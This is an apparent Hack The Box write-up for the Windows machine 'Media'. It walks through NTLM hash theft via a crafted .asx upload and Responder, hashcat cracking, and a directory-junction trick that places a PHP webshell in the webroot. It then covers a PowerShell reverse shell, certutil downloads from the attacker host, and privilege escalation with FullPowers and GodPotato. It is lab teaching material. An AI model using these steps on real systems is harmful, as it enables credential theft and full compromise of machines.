---
layout: post
title: "HTB Media — Full Write-up"
date: 2026-08-19 14:00:00 +0000
categories: [htb, windows]
tags: [file-upload, ntlm-theft, responder, hashcat, ssh, fullpowers, godpotato, privilege-escalation]
---
![HTB Media preview](/assets/img/media/00-media-preview.png)

**Target:** 10.129.234.67 (HTB "Media")
**OS:** Windows Server 2022, standalone — no domain in sight

---

## Recon

Full port sweep first, because guessing is for people who like being wrong:

```bash
nmap -p- --min-rate=2000 -T4 -oN scans/ports_all.txt 10.129.234.67
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server
```

![nmap full port scan results](/assets/img/media/01-nmap-port-scan.png)

SSH, a web server, RDP. A version scan clears up who's actually behind door 22 and 3389:

```bash
nmap -sC -sV -p22,80,3389 -oN scans/ports_detailed.txt 10.129.234.67
```

```
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   NetBIOS_Domain_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   Product_Version: 10.0.20348
```

Windows Server 2022, but not a domain box — `MEDIA` referencing itself as its own domain is the standalone/workgroup tell. No AD means no BloodHound to lean on; this one lives or dies on the web app.

---

## Foothold — the hiring form eats a Windows Media Player file

Port 80 is a stock-photo agency template, "ProMotion Studio":

![ProMotion Studio landing page](/assets/img/media/02-port-80-landing-page.png)

The **Hiring** link drops a "Join Our Team" form with a file upload field, and the label does all the talking: *"Upload a brief introduction video (compatible with Windows Media Player)"*.

![hiring form file upload field](/assets/img/media/03-hiring-form-upload-field.png)

`feroxbuster` against the site turns up nothing upload-related — no `/uploads/`, nothing brute-forceable. Whatever happens to a submitted file, it isn't sitting somewhere web-reachable waiting to be found.

The directory brute-force found nothing, so the next clue had to come from the form itself — and the form already told us what happens to the file: it gets opened in Windows Media Player. That's a big deal, because [Greenwolf's `ntlm_theft`](https://github.com/Greenwolf/ntlm_theft) can build file types that do exactly that. Point WMP (or a bunch of other apps) at one of these files, and it reaches out over SMB to grab it — straight into a listener that logs an NTLMv2 hash, no clicking required beyond the app opening the file.

![ntlm_theft GitHub repository](/assets/img/media/04-ntlm-theft-github.png)

```bash
python3 ntlm_theft.py -g all -s 10.10.17.141 -f media
```

One output line stands out: `media.m3u ... OPEN IN WINDOWS MEDIA PLAYER ONLY` — a dead ringer for the form's wording. `media.asx` goes in as the first attempt, `.asx` being another WMP-only playlist format from the same batch.

![media.asx file selected for upload](/assets/img/media/05-media-asx-selected.png)

Responder goes up to catch the SMB callback:

```bash
sudo responder -I tun0
```

Fill the form with throwaway values, attach `media.asx`, hit upload:

![uploading media.asx through the hiring form](/assets/img/media/06-upload-media-asx-form.png)

And it bites. Nothing on the site suggests a human reviews submissions — something on the backend opened the file itself, no click required:

![Responder capturing enox NTLMv2 hash](/assets/img/media/07-responder-hash-enox.png)

```
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:38f5c2bb741895a3:9D609BE0A38E82CC77548CDEB01FA684:0101...
```

A real local user, `enox`, not a machine account. Off to hashcat:

```bash
hashcat -m 5600 enox_hash.txt /usr/share/wordlists/rockyou.txt
```

![hashcat cracking the enox hash](/assets/img/media/08-hashcat-cracked-password.png)

`enox` : `1234virus@` — rockyou wins again.

---

## Shell as `enox`, and meeting the bot

`OpenSSH for_Windows` on port 22 takes the cracked creds directly:

```bash
ssh enox@10.129.234.67
```

```
enox@MEDIA C:\Users\enox>whoami
media\enox
```

`user.txt` (`6b8f8b313e9ce7ecf312f3c33dbfb88f`) is sitting on the Desktop, and `whoami /priv` for `enox` is bone dry — no `SeImpersonatePrivilege`, no usable token games. Privesc has to come from something readable, not a token trick.

![user.txt flag](/assets/img/media/09-user-flag.png)

`enox`'s Documents folder holds `review.ps1` — the "human" that opens every upload:

![review.ps1 directory listing](/assets/img/media/10-review-ps1-dir-listing.png)

![whoami /priv as enox](/assets/img/media/11-whoami-priv-enox.png)

Reading the script explains everything: it's a loop that checks `C:\Windows\Tasks\Uploads\todo.txt` every 60 seconds for new entries. When a file shows up, the script opens it in the real Windows Media Player app — `Start-Process wmplayer.exe -ArgumentList "...\$randomVariable\$filename"` — lets it run for 15 seconds, then kills it and checks for the next one. This is the "someone" who opened `media.asx` earlier: not a person, just a script blindly launching WMP on whatever the hiring form uploads, no filtering or sandboxing involved.

Each upload lands in its own MD5-named subfolder under `C:\Windows\Tasks\Uploads` — which is exactly why `feroxbuster` never found a drop path: it's a local filesystem location, never served over HTTP.

---

## RCE — turning the upload folder into the webroot

The folder name for each upload is predictable and reproducible, which is the whole opening: delete the hash-named folder, recreate it as a directory junction pointing at `C:\xampp\htdocs`, then upload again with the same effective hash. The file lands — through the junction — straight into the live webroot.

```powershell
PS C:\Windows\Tasks\Uploads> rm .\ba30033323f26917e5de1c1478f2f06b\ -r
PS C:\Windows\Tasks\Uploads> cmd /c mklink /J C:\Windows\Tasks\Uploads\ba30033323f26917e5de1c1478f2f06b C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\...  <<===>>  C:\xampp\htdocs
```

Upload `shell.php` a second time — this time delivered through Burp Repeater instead of the browser, with `Content-Type` on the file part spoofed to `video/mp4` so the form's own checks don't get in the way:

![Burp Repeater request uploading shell.php](/assets/img/media/13-burp-upload-shell-php.png)

```
Content-Disposition: form-data; name="fileToUpload"; filename="shell.php"
Content-Type: video/mp4
```

And it lands right next to the real site files:

![shell.php landed in the webroot](/assets/img/media/12-shell-php-in-webroot.png)

```bash
curl http://10.129.234.67/shell.php?cmd=whoami
nt authority\local service
```

![RCE confirmed as NT AUTHORITY LOCAL SERVICE](/assets/img/media/14-rce-whoami-local-service.png)

Code execution, unauthenticated, as `NT AUTHORITY\LOCAL SERVICE` — the account the web server itself runs under. The junction turned a marketing site's job-application form into an RCE primitive.

---

## Popping a proper shell, then chasing privileges

`?cmd=whoami` gets old fast. Payload from revshells.com (Windows / PowerShell #3, Base64), pointed at 9001:

![revshells.com PowerShell payload generator](/assets/img/media/15-revshells-payload-generator.png)

```bash
nc -lvnp 9001
curl -G "http://10.129.234.67/shell.php" --data-urlencode "cmd=powershell -e <base64>"
```

```
Connection received on 10.129.234.67 60902
whoami
nt authority\local service
PS C:\xampp\htdocs>
```

Interactive shell, same `LOCAL SERVICE` account. `whoami /priv` here is still thin — no `SeImpersonatePrivilege`, so straight-up Potato attacks are off the table. But `SeTcbPrivilege` shows up `Disabled`, which is the tell: the account is *entitled* to more than the current token is holding. That's exactly the gap [`FullPowers`](https://github.com/itm4n/FullPowers) (originally by itm4n, pulled from [securityforge's fork](https://github.com/securityforge/FullPowers) for this run) is built to close — Windows service hardening strips privileges like `SeImpersonatePrivilege` out of service-account tokens by default, and `FullPowers` gets them back.

```powershell
PS C:\xampp\htdocs> certutil.exe -urlcache -split -f http://10.10.17.141:8000/FullPowers.exe
PS C:\xampp\htdocs> .\FullPowers.exe -c "powershell -e <base64, new listener on 9001>" -z
```

New connection, and the token looks completely different:

![whoami /priv after FullPowers restores SeImpersonatePrivilege](/assets/img/media/16-whoami-priv-fullpowers.png)

```
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Still `LOCAL SERVICE`, but now holding `SeImpersonatePrivilege` — the entire Potato family just unlocked.

---

## Root — GodPotato

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

[GodPotato](https://github.com/BeichenDream/GodPotato) is the tool for the job — there's a whole family of "Potato" exploits, each tuned for a different Windows version, but the .NET4 build of GodPotato just works on Server 2022 without having to pick the right one. Downloaded onto the box the same way as every other tool here (`certutil -urlcache`), renamed to the shorter `gp.exe`, and run from the shell that already has `SeImpersonatePrivilege` back (thanks to `FullPowers` from the step before):

```powershell
PS C:\xampp\htdocs> .\gp.exe -cmd "powershell -e <base64, listener on 9003>" -z
```

Here's the trick GodPotato pulls: it tricks a Windows service that always runs as SYSTEM into connecting back to a fake named pipe it controls. Because the current shell has `SeImpersonatePrivilege`, it's allowed to "borrow" the identity of whoever connects to that pipe — so when the SYSTEM service connects, GodPotato grabs its SYSTEM token and uses it to launch our payload. New listener, and this time it comes back as SYSTEM:

![whoami as NT AUTHORITY SYSTEM after GodPotato](/assets/img/media/17-godpotato-whoami-system.png)

```
PS C:\xampp\htdocs> whoami
nt authority\system
```

```
PS C:\Users\Administrator\Desktop> cat root.txt
ef8ec3e0743701ed829b5994d7b97a60
```

![root.txt flag](/assets/img/media/18-root-flag.png)

---

## Recap

1. Full port scan → SSH, web (Apache/PHP on Windows), RDP. No AD.
2. Hiring form's upload field name-drops "Windows Media Player" — a spec, not flavor text.
3. `ntlm_theft` generates a `.asx` file; Responder catches an NTLMv2 hash for `enox` when the backend opens it, no human involved.
4. `hashcat -m 5600` + rockyou cracks it in seconds.
5. SSH in as `enox`, grab `user.txt`, find `review.ps1` — a polling loop that launches real Windows Media Player on every queued upload.
6. Each upload's drop folder is a predictable MD5-named directory — delete it, replace it with a junction to the webroot, and the next upload lands inside the live site.
7. Upload a PHP webshell through the same form (Burp, spoofed `Content-Type`) → unauthenticated RCE as `LOCAL SERVICE`.
8. `SeTcbPrivilege` shows up disabled → `FullPowers` restores the account's stripped privileges, including `SeImpersonatePrivilege`.
9. `GodPotato` coerces a SYSTEM token over that privilege → root.

**Lessons learned:**
- Read form labels literally — "compatible with Windows Media Player" wasn't marketing copy, it was a description of exactly what the backend does with the file.
- Any automated process that opens user-uploaded files by itself (no human clicking) is a free NTLM hash waiting to happen.
- `whoami /priv` only shows what the *current token* is holding, not what the account is actually allowed to have. A service account can look harmless and still be one restored privilege away from `SeImpersonatePrivilege` — which is exactly what `FullPowers` is for.
